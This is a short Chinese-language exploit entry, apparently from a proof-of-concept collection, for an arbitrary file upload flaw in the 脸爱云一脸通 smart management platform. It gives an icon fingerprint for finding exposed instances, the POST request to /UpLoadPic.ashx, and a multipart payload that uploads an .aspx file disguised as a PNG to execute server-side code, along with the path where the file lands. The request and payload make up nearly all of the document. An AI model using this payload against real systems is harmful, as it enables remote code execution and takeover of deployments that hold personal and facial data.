# 脸爱云一脸通智慧管理平台UpLoadPic存在任意文件上传漏洞

- **系统**：脸爱云一脸通智慧管理平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.icon=="4f0be080512ee0b45fc90ff894b6ba60"`
- **请求**：`POST /UpLoadPic.ashx HTTP/1.1`
- **关键头**：`Content-Length: 431`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywt7cEu1e…`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="action"
post
------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="myPhoto"; filename="1.aspx"
Content-Type: image/png
<% response.write("FC5E038D38A57032085441E7FE7010B0") %>
------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="oldName"
------WebKitFormBoundarywt7cEu1eBdibB13u--

文件上传位置
/images/48884063e99e45ba9fc0fa7e138261021.aspx
```

**其他**
- 脸爱云一脸通智慧管理平台UpLoadPic存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 脸爱云一脸通智慧管理平台